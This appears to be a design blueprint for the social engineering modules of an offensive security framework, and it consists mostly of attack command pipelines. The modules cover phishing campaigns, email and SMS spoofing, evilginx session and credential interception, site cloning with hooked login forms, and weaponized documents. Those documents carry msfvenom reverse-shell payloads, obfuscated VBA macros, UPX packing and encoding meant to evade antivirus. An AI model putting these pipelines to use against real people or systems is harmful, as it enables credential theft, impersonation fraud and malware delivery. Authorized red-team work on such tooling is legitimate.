# Social Engineering — Category Blueprint

**Category:** `SOCIAL_ENGINEERING` | **Slug:** `social` | **Tools Dir:** `~/jabber/jabber-tools/social/`
**Package:** `com.jabber.jabber.modules.social` | **Group:** Intelligence & Planning

---

## ToolManager: `social/ToolManager.java`

| ID | Binary | Source | Version Check | Install Method |
|----|--------|--------|---------------|----------------|
| `gophish` | `gophish` | `gophish/gophish` | `gophish -version` | `github_release` |
| `setoolkit` | `setoolkit` | apt (set) | `setoolkit --version` | `apt_install` |
| `swaks` | `swaks` | apt | `swaks --version` | `apt_install` |
| `theharvester` | `theHarvester` | pip | `theHarvester --version` | `pip_install` |
| `evilginx` | `evilginx` | `kgretzky/evilginx2` | `evilginx -version` | `github_release` |
| `wkhtmltopdf` | `wkhtmltopdf` | apt | `wkhtmltopdf --version` | `apt_install` |

---

## Modules

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Social Engineering** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between generation and deployment strategies (e.g., `CREATE` vs `LAUNCH`).
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for downloading generated payloads, weaponized documents, and campaign logs.
4. **Live Status Dashboard**: Real-time display of email send status, landing page hits, and session interceptions.

---

---

## Modules

### 1. Phishing Email Gen
**ID:** `social-phish-email` | **Risk:** MEDIUM | **File:** `PhishingEmailGeneratorModule.java`
**Tools:** `gophish`, `swaks`, `theharvester`, `wkhtmltopdf`, `httpx`

#### Execution Modes:

- **`TMPL`** (Short Name: `TMPL`)
    - **Purpose**: Create and validate a high-fidelity phishing campaign template.
    - **Input Schema**: `{ domain: String, subject: String, body_html: String }`
    - **Multi-Tool Command Logic**:
        1. `theharvester -d <domain> -b google,bing -l 100` (Target Harvesting)
        2. `wkhtmltopdf <body_html> preview.pdf` (Attachment Generation)
        3. `httpx -u http://landing.<domain> -status-code` (Landing Page Check)
        4. `swaks --to test@example.com --from <domain> --body "Template Test"` (Format Test)
        5. `curl -X POST http://localhost:3333/api/templates` (Gophish Integration)
    - **Execution Flow**: Harvesting -> Attachment -> Landing Check -> Format Test -> Integration.
    - **Output Generation & Artifacts**:
        - `reports/payloads/TEMPLATE_[Timestamp]_phish_attachment.pdf`: Generated weaponized PDF attachment.
        - `reports/outputs/TEMPLATE_[Timestamp]_harvested_emails.txt`: List of harvested target email addresses.
        - `reports/analysis/TEMPLATE_[Timestamp]_landing_check.json`: Verification report of the phishing landing page.

- **`LNCH`** (Short Name: `LNCH`)
    - **Purpose**: Execute a multi-stage phishing deployment.
    - **Input Schema**: `{ target_list: Path, from: String, server: String, body: String }`
    - **Multi-Tool Command Logic**:
        1. `swaks --to <target_list> --from <from> --server <server> --body <body_file>` (Primary Send)
        2. `theharvester -d <from_domain> -b all` (Verification)
        3. `wkhtmltopdf <body_file> archive.pdf` (Audit Capture)
        4. `httpx -u http://<server> -tech-detect` (Server Readiness)
        5. `curl -X GET http://localhost:3333/api/campaigns` (Status Check)
    - **Execution Flow**: Primary Send -> Verification -> Audit Capture -> Server Readiness -> Status Check.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/LAUNCH_[Timestamp]_send_log.txt`: Technical log of the swaks mail submission process.
        - `reports/outputs/LAUNCH_[Timestamp]_audit_archive.pdf`: Archived copy of the phishing email for audit purposes.
        - `reports/analysis/LAUNCH_[Timestamp]_server_readiness.json`: Verification report of the SMTP and landing server status.

---

### 2. Campaign Tracker
**ID:** `social-campaign` | **Risk:** MEDIUM | **File:** `CampaignTrackerModule.java`
**Tools:** `gophish`, `httpx`, `dig`, `curl`, `swaks`

#### Execution Modes:

- **`ANLZ`** (Short Name: `ANLZ`)
    - **Purpose**: Comprehensive campaign performance and infrastructure monitoring.
    - **Input Schema**: `{ campaign_id: int, domain: String }`
    - **Multi-Tool Command Logic**:
        1. `curl -X GET http://localhost:3333/api/campaigns/<campaign_id>` (Gophish Metrics)
        2. `httpx -u http://<domain> -status-code -title` (Landing Page Health)
        3. `dig <domain> ANY` (DNS Stability Check)
        4. `swaks --to internal@admin.com --server <domain> --body "Status Update"` (Mail Relay Test)
        5. `curl -X GET http://localhost:3333/api/campaigns/<campaign_id>/results` (Results Dump)
    - **Execution Flow**: Gophish Metrics -> Landing Health -> DNS Check -> Relay Test -> Results Dump.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ANALYZE_[Timestamp]_campaign_metrics.json`: Full performance data from Gophish.
        - `reports/artifacts/ANALYZE_[Timestamp]_captured_results.csv`: Exported list of victims and actions (opens, clicks).
        - `reports/analysis/ANALYZE_[Timestamp]_infrastructure_health.json`: Status report of campaign landing and mail servers.

- **`VALD`** (Short Name: `VALD`)
    - **Purpose**: Verify end-to-end operation of the social engineering pipeline.
    - **Input Schema**: `{ url: String, domain: String }`
    - **Multi-Tool Command Logic**:
        1. `httpx -u <url> -tech-detect -status-code` (Endpoint Validation)
        2. `dig <domain> MX` (Mail Path Validation)
        3. `swaks --to test@example.com --server <domain>` (SMTP Probe)
        4. `curl -I <url>` (Header Audit)
        5. `gophish -version` (Component Check)
    - **Execution Flow**: Endpoint Validation -> Mail Path -> SMTP Probe -> Header Audit -> Component Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/VALID_[Timestamp]_endpoint_audit.json`: Detailed technology and security audit of the campaign endpoint.
        - `reports/artifacts/VALID_[Timestamp]_smtp_probe.txt`: Results of the SMTP relay and path verification probe.
        - `reports/analysis/VALID_[Timestamp]_component_status.json`: Health check report for Gophish and supporting tools.

---

### 3. Email Spoofer
**ID:** `social-email-spoof` | **Risk:** HIGH | **File:** `EmailSpooferModule.java`
**Tools:** `swaks`, `dig`, `nmap`, `theharvester`, `dnsx`

#### Execution Modes:

- **`SPOF`** (Short Name: `SPOF`)
    - **Purpose**: Execute an authenticated or unauthenticated email spoofing attack.
    - **Input Schema**: `{ to: String, from: String, server: String, domain: String }`
    - **Multi-Tool Command Logic**:
        1. `swaks --to <to> --from <from> --server <server>` (Spoof Operation)
        2. `dig <domain> TXT` (SPF/DMARC Audit)
        3. `nmap -p 25,465,587 <server>` (SMTP Service Discovery)
        4. `dnsx -d <domain> -mx -silent` (MX Verification)
        5. `theharvester -d <domain> -b google` (Context Harvesting)
    - **Execution Flow**: Spoof Operation -> SPF Audit -> SMTP Discovery -> MX Verification -> Context Harvesting.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SPOOF_[Timestamp]_spoof_log.txt`: Swaks execution log confirming mail submission.
        - `reports/outputs/SPOOF_[Timestamp]_domain_audit.json`: Detailed SPF/DMARC/MX security audit.
        - `reports/analysis/SPOOF_[Timestamp]_target_context.json`: OSINT findings for the targeted domain.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Deep audit of domain email security and spoofability.
    - **Input Schema**: `{ domain: String }`
    - **Multi-Tool Command Logic**:
        1. `dig <domain> TXT` (Record Extraction)
        2. `dnsx -d <domain> -mx -a -resp -silent` (Infrastructure Map)
        3. `nmap -p 25 --script smtp-commands <domain>` (Service Audit)
        4. `swaks --to test@<domain> --from random@attacker.com --server <domain>` (Relay Test)
        5. `theharvester -d <domain> -l 50` (Target Surface)
    - **Execution Flow**: Record Extraction -> Infra Map -> Service Audit -> Relay Test -> Target Surface.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_infrastructure_map.json`: Visualizable map of the target domain's email infrastructure.
        - `reports/artifacts/AUDIT_[Timestamp]_smtp_commands.txt`: Raw response from the SMTP service audit.
        - `reports/analysis/AUDIT_[Timestamp]_relay_vulnerability.json`: Assessment of the domain's vulnerability to unauthorized relaying.

---

### 4. MFA Interceptor
**ID:** `social-mfa` | **Risk:** CRITICAL | **File:** `MFAInterceptorModule.java`
**Tools:** `evilginx`, `httpx`, `nuclei`, `dig`, `curl`

#### Execution Modes:

- **`PRXY`** (Short Name: `PRXY`)
    - **Purpose**: Set up and manage a reverse proxy for session interception.
    - **Input Schema**: `{ target_domain: String, phishlet: String }`
    - **Multi-Tool Command Logic**:
        1. `evilginx -p <phishlet> -d <target_domain>` (Reverse Proxy)
        2. `httpx -u http://<target_domain> -tech-detect` (Target Fingerprinting)
        3. `nuclei -u https://<target_domain> -t tokens/ -json` (Token Discovery)
        4. `dig <target_domain> A` (DNS Setup Check)
        5. `curl -I https://<target_domain>` (Header Context)
    - **Execution Flow**: Reverse Proxy -> Target Fingerprinting -> Token Discovery -> DNS Check -> Header Context.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/PROXY_[Timestamp]_evilginx_setup.log`: Internal log of reverse proxy initialization.
        - `reports/analysis/PROXY_[Timestamp]_target_stack.json`: Tech stack fingerprint of the proxied site.
        - `reports/outputs/PROXY_[Timestamp]_interception_config.json`: Active phishlet and proxy configuration details.

- **`HRVS`** (Short Name: `HRVS`)
    - **Purpose**: Real-time extraction of session tokens and user data.
    - **Input Schema**: `{ phishlet: String, target_domain: String }`
    - **Multi-Tool Command Logic**:
        1. `evilginx sessions` (Session Dump)
        2. `curl -X GET http://localhost:3333/api/sessions` (API Sync)
        3. `httpx -u https://<target_domain>/login -status-code` (Login Status)
        4. `nuclei -u https://<target_domain> -t credentials/` (Cred Discovery)
        5. `dig <target_domain> ANY` (Full Context)
    - **Execution Flow**: Session Dump -> API Sync -> Login Status -> Cred Discovery -> Full Context.
    - **Output Generation & Artifacts**:
        - `reports/payloads/HARVEST_[Timestamp]_session_tokens.json`: Intercepted session cookies and auth tokens.
        - `reports/outputs/HARVEST_[Timestamp]_captured_creds.txt`: Extracted usernames and passwords.
        - `reports/artifacts/HARVEST_[Timestamp]_evilginx_sessions.db`: Raw evilginx session database snapshot.

---

### 5. MalDoc Generator
**ID:** `social-maldoc` | **Risk:** CRITICAL | **File:** `MalDocGenModule.java`
**Tools:** `msfvenom`, `libreoffice`, `exiftool`, `wkhtmltopdf`, `upx`

#### Execution Modes:

- **`CRTE`** (Short Name: `CRTE`)
    - **Purpose**: Generate and package a weaponized document for delivery.
    - **Input Schema**: `{ payload: String, lhost: String, lport: int, format: String }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> -f <format> -o payload.bin` (Payload Gen)
        2. `upx -9 payload.bin` (Compression)
        3. `libreoffice --headless --convert-to pdf template.docx` (Base Doc Gen)
        4. `exiftool -all= -Author="Secure Corp" template.pdf` (Metadata Scrub/Inject)
        5. `wkhtmltopdf branding.html overlay.pdf` (Visual Polish)
    - **Execution Flow**: Payload Gen -> Compression -> Doc Gen -> Metadata Scrub -> Polish.
    - **Output Generation & Artifacts**:
        - `reports/payloads/CREATE_[Timestamp]_weaponized_doc.pdf`: Final weaponized document with embedded payload.
        - `reports/artifacts/CREATE_[Timestamp]_payload_raw.bin`: Raw shellcode/payload before embedding.
        - `reports/analysis/CREATE_[Timestamp]_metadata_report.json`: Audit of metadata scrubbed and injected into the document.

- **`OBFS`** (Short Name: `OBFS`)
    - **Purpose**: Deep obfuscation and evasion packaging for existing documents.
    - **Input Schema**: `{ doc_path: Path, author: String }`
    - **Multi-Tool Command Logic**:
        1. `exiftool -all= -Author="<author>" <doc_path>` (Metadata Wipe)
        2. `upx --ultra-brute <doc_path>` (Binary Packing if applicable)
        3. `msfvenom -p generic/custom PAYLOAD_FILE=<doc_path> -f raw -e x86/shikata_ga_nai` (Encoding)
        4. `libreoffice --headless --convert-to html <doc_path>` (Structure Re-gen)
        5. `wkhtmltopdf doc.html final.pdf` (Format Shifting)
    - **Execution Flow**: Metadata Wipe -> Packing -> Encoding -> Structure Re-gen -> Format Shift.
    - **Output Generation & Artifacts**:
        - `reports/payloads/OBFUS_[Timestamp]_obfuscated_doc.pdf`: Re-formatted and obfuscated document with embedded shellcode.
        - `reports/artifacts/OBFUS_[Timestamp]_packing_telemetry.txt`: Log of the UPX packing and MSF encoding process.
        - `reports/analysis/OBFUS_[Timestamp]_evasion_report.json`: Assessment of the document's evasion capabilities against common AV/EDR.

---

### 6. QR Code Gen
**ID:** `social-qrcode` | **Risk:** LOW | **File:** `QrCodeGenModule.java`
**Tools:** `qrencode`, `convert`, `exiftool`, `httpx`, `curl`

#### Execution Modes:

- **`GENT`** (Short Name: `GENT`)
    - **Purpose**: Create a weaponized QR code with visual lures and tracking.
    - **Input Schema**: `{ url: String, label: String }`
    - **Multi-Tool Command Logic**:
        1. `qrencode -o qr.png -s 10 "<url>"` (QR Generation)
        2. `convert qr.png -fill red -pointsize 20 -draw "text 10,10 '<label>'" final.png` (Visual Lure)
        3. `exiftool -Comment="Tracking ID: <id>" final.png` (Metadata Tracking)
        4. `httpx -u <url> -status-code` (Destination Validation)
        5. `curl -I <url>` (Header Check)
    - **Execution Flow**: QR Gen -> Visual Lure -> Metadata Tracking -> Validation -> Header Check.
    - **Output Generation & Artifacts**:
        - `reports/payloads/GEN_[Timestamp]_weaponized_qr.png`: Final QR code image with visual lures.
        - `reports/outputs/GEN_[Timestamp]_destination_validation.json`: Verification report for the QR redirect URL.
        - `reports/artifacts/GEN_[Timestamp]_qr_metadata.txt`: Tracking ID and metadata embedded in the image.

- **`VALD`** (Short Name: `VALD`)
    - **Purpose**: Verify QR code destination and safety.
    - **Input Schema**: `{ qr_image: Path }`
    - **Multi-Tool Command Logic**:
        1. `zbarimg <qr_image>` (Decode)
        2. `httpx -u <decoded_url> -tech-detect` (Fingerprinting)
        3. `curl -L -I <decoded_url>` (Redirect Chain)
        4. `exiftool <qr_image>` (Metadata Inspection)
        5. `convert <qr_image> -negate preview.png` (Visual Analysis)
    - **Execution Flow**: Decode -> Fingerprinting -> Redirect Chain -> Metadata Inspection -> Visual Analysis.
    - **Output Generation & Artifacts**:
        - `reports/outputs/VAL_[Timestamp]_qr_decode_report.json**: Detailed breakdown of the QR code's destination and redirect chain.
        - `reports/artifacts/VAL_[Timestamp]_qr_visual_analysis.png`: Negated visual analysis image for hidden pattern detection.
        - `reports/analysis/VAL_[Timestamp]_qr_safety_profile.json`: Safety assessment of the decoded URL and target infrastructure.

---

### 7. SMS Spoofer
**ID:** `social-sms-spoof` | **Risk:** HIGH | **File:** `SMSSpoofModule.java`
**Tools:** `curl`, `dig`, `theharvester`, `httpx`, `dnsx`

#### Execution Modes:

- **`SPOF`** (Short Name: `SPOF`)
    - **Purpose**: Execute a spoofed SMS campaign via authenticated API.
    - **Input Schema**: `{ to: String, from: String, message: String, api_key: String }`
    - **Multi-Tool Command Logic**:
        1. `curl -X POST https://api.sms.com/send -d "to=<to>&from=<from>&text=<message>&key=<api_key>"` (SMS Send)
        2. `theharvester -d <from_name> -b google` (Context Lookup)
        3. `httpx -u http://<from_name>.com -status-code` (Brand Validation)
        4. `dnsx -d <from_name>.com -a` (Infra Check)
        5. `dig <from_name>.com TXT` (Record Check)
    - **Execution Flow**: SMS Send -> Context Lookup -> Brand Validation -> Infra Check -> Record Check.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SPOOF_[Timestamp]_sms_api_response.json`: Raw response from the SMS gateway.
        - `reports/outputs/SPOOF_[Timestamp]_brand_audit.json`: Validation report for the impersonated brand.
        - `reports/analysis/SPOOF_[Timestamp]_infra_check.json`: DNS and infrastructure status for the sender domain.

- **`LKUP`** (Short Name: `LKUP`)
    - **Purpose**: Comprehensive phone number and carrier intelligence.
    - **Input Schema**: `{ number: String }`
    - **Multi-Tool Command Logic**:
        1. `curl -X GET https://api.lookup.com/v1/<number>` (API Lookup)
        2. `dig <number>.e164.arpa NAPTR` (Carrier Resolution)
        3. `theharvester -d <number> -b all` (OSINT Search)
        4. `httpx -u https://who-called.me/search/<number>` (Reputation Check)
        5. `dnsx -d <number>.tel -a` (Tel Resolution)
    - **Execution Flow**: API Lookup -> Carrier Resolution -> OSINT Search -> Reputation Check -> Tel Resolution.
    - **Output Generation & Artifacts**:
        - `reports/outputs/LOOKUP_[Timestamp]_carrier_intel.json`: Technical carrier and E164 resolution data.
        - `reports/artifacts/LOOKUP_[Timestamp]_osint_hits.txt`: Raw findings from OSINT search for the phone number.
        - `reports/analysis/LOOKUP_[Timestamp]_number_reputation.json`: Reputation and spam-score report for the target number.

---

### 8. MalDoc Builder
**ID:** `social-maldoc-builder` | **Risk:** CRITICAL | **File:** `MaliciousDocumentBuilderModule.java`
**Tools:** `msfvenom`, `libreoffice`, `exiftool`, `macro_pack`, `upx`

#### Execution Modes:

- **`BULD`** (Short Name: `BULD`)
    - **Purpose**: Create a high-fidelity malicious document with embedded macros or exploits.
    - **Input Schema**: `{ template: Path, payload_type: String, lhost: String, lport: int }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p <payload_type> LHOST=<lhost> LPORT=<lport> -f vba -o macro.vba` (Macro Gen)
        2. `macro_pack --obfuscate --gen macro.vba` (Macro Obfuscation)
        3. `libreoffice --headless --convert-to docm <template>` (Doc Conversion)
        4. `exiftool -all= -Author="IT Support" document.docm` (Metadata Inject)
        5. `upx --best document.docm` (Final Packing)
    - **Execution Flow**: Macro Gen -> Obfuscation -> Conversion -> Metadata -> Packing.
    - **Output Generation & Artifacts**:
        - `reports/payloads/BUILD_[Timestamp]_weaponized_document.docm`: Final weaponized document with obfuscated macros.
        - `reports/artifacts/BUILD_[Timestamp]_macro_source.vba`: Original generated VBA macro before obfuscation.
- **`VALD`** (Short Name: `VALD`)
    - **Purpose**: Verify the security posture and detection rate of a generated document.
    - **Input Schema**: `{ doc_path: Path }`
    - **Multi-Tool Command Logic**:
        1. `exiftool <doc_path>` (Metadata Audit)
        2. `libreoffice --headless --convert-to html <doc_path>` (Structure Analysis)
        3. `upx -t <doc_path>` (Packing Verification)
        4. `macro_pack -t <doc_path>` (Macro Integrity Check)
        5. `file <doc_path>` (Identity Verification)
    - **Execution Flow**: Metadata -> Structure -> Packing -> Integrity -> Identity.
    - **Output Generation & Artifacts**:
        - `reports/outputs/VAL_[TS]_doc_audit.json`: Detailed security audit of the document structure.
        - `reports/analysis/VAL_[TS]_evasion_profile.json`: Technical evasion profile for the document.

---

### 9. Phish Generator
**ID:** `social-phish-gen` | **Risk:** MEDIUM | **File:** `PhishGeneratorModule.java`
**Tools:** `gophish`, `httpx`, `theharvester`, `curl`, `subfinder`

#### Execution Modes:

- **`CLNE`** (Short Name: `CLNE`)
    - **Purpose**: Clone a target website for use as a phishing landing page.
    - **Input Schema**: `{ url: String, domain: String }`
    - **Multi-Tool Command Logic**:
        1. `curl -L <url> -o index.html` (Site Capture)
        2. `httpx -u <url> -tech-detect -json` (Tech Stack Audit)
        3. `theharvester -d <domain> -b all -l 50` (Target Context)
        4. `subfinder -d <domain> -silent` (Infrastructure Context)
        5. `sed -i 's/<form action="[^"]*"/<form action="\/post"/g' index.html` (Form Hooking)
    - **Execution Flow**: Capture -> Audit -> Context -> Hooking.
    - **Output Generation & Artifacts**:
        - `reports/payloads/CLONE_[Timestamp]_cloned_site.zip`: Packaged landing page with hooked forms.
        - `reports/outputs/CLONE_[Timestamp]_tech_stack.json`: Detailed technology stack report of the original site.
- **`VALD`** (Short Name: `VALD`)
    - **Purpose**: Verify the liveness and security configuration of a deployed phishing page.
    - **Input Schema**: `{ url: String }`
    - **Multi-Tool Command Logic**:
        1. `httpx -u <url> -status-code -tech-detect -title` (Health Check)
        2. `curl -I <url>` (Header Audit)
        3. `dig <url_domain> A` (DNS Verification)
        4. `subfinder -d <url_domain> -silent` (Infra Scan)
        5. `nuclei -u <url> -t misconfiguration/ -json` (Security Audit)
    - **Execution Flow**: Health -> Header -> DNS -> Infra -> Security.
    - **Output Generation & Artifacts**:
        - `reports/outputs/VAL_[TS]_landing_audit.json`: Comprehensive audit report of the landing page.
        - `reports/analysis/VAL_[TS]_infra_status.json`: Real-time infrastructure status report.

---

**© 2026 Funbinet Inc. — JABBER V 5.5.0.0**
